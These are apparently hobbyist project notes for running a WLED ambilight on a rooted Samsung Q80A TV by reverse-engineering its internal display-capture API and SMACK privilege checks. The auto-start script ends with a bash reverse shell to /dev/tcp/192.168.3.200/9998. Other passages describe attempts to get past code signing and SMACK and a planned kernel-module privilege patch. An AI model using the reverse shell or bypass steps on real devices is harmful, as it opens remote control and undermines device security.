# Native Ambilight on Tizen 6.0 — no HyperTizen

Working end-to-end ambilight for the Samsung Q80A (NikeM2, Tizen 6.0), built on a
display-capture API that ships in the stock firmware. ~25 fps, 226-LED WLED strip,
runs entirely on the TV.

## The capture API

`/usr/lib/libdisplay-capture-api.so.0` exports Samsung's internal screen-capture
API — the same one the `samsung-tv-root` QN90B payload uses. It's loaded at
runtime by `/bin/abnormal_user_behavior` (Samsung's own telemetry daemon, uid
5001), proving the path is production-real.

Three entry points (netcoreapp3.1, P/Invoke):

| Symbol | Notes |
|---|---|
| `dc_request_capture_to_file_sync` | Writes JPEG/PNG to a caller-chosen dir. **Rejects `/tmp`** (strncmp check). Works as root. |
| `dc_request_capture_sync` | Writes `volt_app_<file>.png` into `/opt/share/display-capture-service/`. Last 2 args are `app_id` + filename strings, NOT buffers. |
| `dc_request_capture` | Async variant (untested). |

Request struct (`DisplayCaptureRequest`, 280 bytes):

```c
struct {
  int appType;        // <= 6  (0-3 all capture the same screen)
  int captureMode;    // <= 4  (mode 0 works; mode 1 sometimes)
  int compressionType;// <= 1  (0 = PNG ~650ms, 1 = JPEG ~30-45ms)
  int quality;
  char* directoryPath;// must exist, must NOT start with /tmp
  char* fileName;
  int width, height;  // requested (clamped: 960x540 -> 720x540, 320x240 -> 480x270)
  int returnWidth, returnHeight;
  char returnPath[256];
}
```

**Privilege:** running as root works fully. As uid 5001 (owner) the capture
itself succeeds (returnWidth/Height come back filled) but the final file write
fails (`r=1`) — likely a SMACK-label or daemon-side write step, not the capture.

**Speed:** `compressionType=1` (JPEG) is ~10-20x faster than PNG — the PNG
encode was the entire bottleneck. JPEG 480x270 = ~40ms/frame, real JFIF output.

## The pipeline (tools/sdpmemcs/WledAmbi.cs)

Single .NET exe, run via the signed `/usr/bin/dotnet` host — UEP never sees an
unsigned executable (the .exe is just managed data).

```
dc_request_capture_to_file_sync (comp=1)  ~30ms
  -> JPEG file in /home/owner/share/caps/
  -> tjDecompress2 (stock libturbojpeg.so.0) -> RGB   ~10ms
  -> edge strip averages for 226 LEDs      ~2ms
  -> DDP packet -> 192.168.3.176:4048 (UDP)
```

Total ~45ms/frame ≈ 20-25 fps.

LED layout (top-left corner, clockwise, 60led/m WS2812):
top 0-71 (L→R) · right 72-112 (T→B) · bottom 113-184 (R→L) · left 185-225 (B→T)

## Start / stop

The stage-2 `/home/owner/share/r` now auto-launches the daemon — the same
Shared Folder click that arms root also starts the ambilight:

```bash
#!/bin/bash
mkdir -p /home/owner/share/caps
pkill -f WledAmbi 2>/dev/null
(cd /home/owner/share && dotnet WledAmbi.exe 192.168.3.176 4048 \
   /home/owner/share/caps 0 -1 > /home/owner/share/ambi.log 2>&1 &)
/bin/bash -i >& /dev/tcp/192.168.3.200/9998 0>&1
```

Manual: `dotnet /home/owner/share/WledAmbi.exe <wledIp> <ddpPort> <capDir> <sleepMs> <maxFrames>`
Kill: `pkill -f WledAmbi`

Known limitations: needs root for the file-write step; survives shell drop but
not TV reboot; HDCP/DRM content will likely capture black (untested).


## Update — raw capture path (ppicapture), no file needed

`dc_request_capture_to_file_sync`'s privileged step is the **file write**, not the capture.
The internal `ppicapture` (exported as `_Z10ppicaptureP13RequestedDataPhS1_i`) returns
frame data via pointers inside RequestedData — no file, no JPEG, ~20ms/frame (**~50fps**).

RequestedData (512B buf, filled by lib):
- `+0x00` requested w (in), actual w (out) — clamps 960->720
- `+0x04` requested h (in), actual h (out)
- `+0x0c` y size (=w*h), `+0x10` c size (=w*h)
- `+0x14` Y plane pointer, `+0x18` chroma pointer (lib-owned memory!)
- `+0x1c` mode in (0 works), `+0x24`=2, `+0x28`=6 before call

**Pixel format: NV16** — Y plane w*h; chroma interleaved Cb,Cr at full width but
half vertical res: `ci = (y/2)*w + (x&~1)`; Cb=c[ci], Cr=c[ci+1].

## Privilege finding (why TizenBrew can't launch it)

- `ppicapture` as **uid 5001 + root-shell SMACK label** → real frames
- Same binary under **TizenBrew StandaloneService** (uid 5001, app label) → **black frames**
- Conclusion: the capture daemon gates on SMACK label / privilege, not uid.
  TizenBrew already declares `recorder`+`mediacapture` and still gets black —
  needs a Samsung-level capture privilege normal apps can't get.

## TizenBrew local-module plumbing (for reference)

Service = `xvvl3S1bvH.Stan` (`/usr/bin/wrt-service`, uid 5001, HTTP :8081).
Runs the **webpack bundle** `service-nextgen/service/dist/index.js` (2MB) —
patches to `service/index.js` or `utils/*.js` are DEAD CODE, patch dist only.

Patched in dist/index.js:
- `app.all`: `/local/` static route -> `res/wgt/localmodules/`; `/module/local%2Fx/...` redirect
- moduleLoader/serviceLauncher fetches (`cdn.jsdelivr.net/${module}/...`) redirected to `127.0.0.1:8081/local/` for `local/*`
- modules live at `wgt/localmodules/<name>/`, config `/home/owner/share/tizenbrewConfig.json`

Module `local/wled-ambi` spawns `dotnet WledAmbiPpi.exe` — spawn works, capture black (above).

## Remaining launcher options

- 1-click Shared Folder -> stage2 `r` auto-launches WledAmbiPpi (works today)
- Custom WGT: needs signing cert + a capture privilege normal apps lack — open question


## The capture gate is SMACK label (final)

- uid 5001 + `System::Privileged` (shell/mount context) -> real frames, any gid
- uid 5001 + app label (TizenBrew StandaloneService) -> ppicapture returns
  r=0 but **zeroed/black frames** — daemon checks the peer label (SO_PEERSEC),
  not uid, not manifest privileges (added display/appmanager/drmplay to
  TizenBrew config — still black)

**All no-root launcher paths exhausted:**
- SMACK64EXEC on a copied dotnet -> UEP blocks unsigned copies
- SMACK64EXEC on /usr/bin/dotnet -> rootfs is ro
- init.d/cron -> nothing executes from writable paths at boot
- TizenBrew/WGT service -> app label, capture denied

=> Starting the ambilight requires the mount/stage2 context (1 Shared-Folder
   click per boot), or a kernel module patching the SMACK check
   (insmod of unsigned .ko already proven — future project).

WGT skeleton kept in apps/wled-ambi/ for reference — would hit the same
label wall as TizenBrew even if signed.


## Zero-click status (2025-10-25)

- Daemon needs uid 5001 + SMACK `User` (or better) — proven `User` captures.
- No userland zero-click exec found: TizenBrew service is `User` but app-sandbox
  blocks system-binary exec (EACCES); module vm lacks child_process;
  sdbd `sync:` = write-only, `appinstall`/`vd_appinstall` no eval, `exec:`/`shell:` refused.
- Remaining path: kernel module NOP-ing `e_security_privilege_check`
  (@ 0x4ddd5 in /usr/bin/enlightenment) — deferred, deemed too risky for now.

## PC auto-start stack

- `kit/tv-stack.py` — one process: 9998 shell, 9997 control bridge, 9999 beacon, 8888 GET (serves tools/), 8899 PUT (uploads to tools/tvbin/)
- `kit/tv-stack.bat` — run once manually
- `kit/install-startup.bat` — RUN AS ADMIN once: registers tv-stack at logon + scheduled task re-arming the tvrdp password (payload) every boot
- After install: every PC boot leaves the stack armed → TV side is just Remote PC -> Shared Folder
